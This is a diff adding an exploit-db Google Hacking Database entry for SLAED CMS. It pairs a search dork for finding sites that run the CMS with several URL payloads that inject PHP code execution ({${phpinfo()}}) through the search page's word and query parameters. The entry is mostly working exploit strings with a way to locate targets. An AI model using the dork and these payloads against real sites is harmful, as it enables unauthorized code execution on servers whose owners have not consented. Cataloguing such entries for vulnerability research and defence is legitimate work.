@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/3740
+Category:         Advisories and Vulnerabilities
+Published Date:   2011-09-12
+Author:           anonymous
+GoogleDork:       "Powered by SLAED CMS"
+Description:      "Powered by SLAED CMS"
+
+
+Exploit Title: Slaed CMS Code exec On different versions of this software next vulnerabilities are availible: /index.php?name=Search&amp;mod=&amp;word={${phpinfo()}}&amp;query=ok&amp;to=view /index.php?name=Search&amp;mod=&amp;word=ok&amp;query={${phpinfo()}}&amp;to=view OR: /search.html?mod=&amp;word={${phpinfo()}}&amp;query=ok&amp;to=view /search.html?mod=&amp;word=ok&amp;query={${phpinfo()}}&amp;to=view
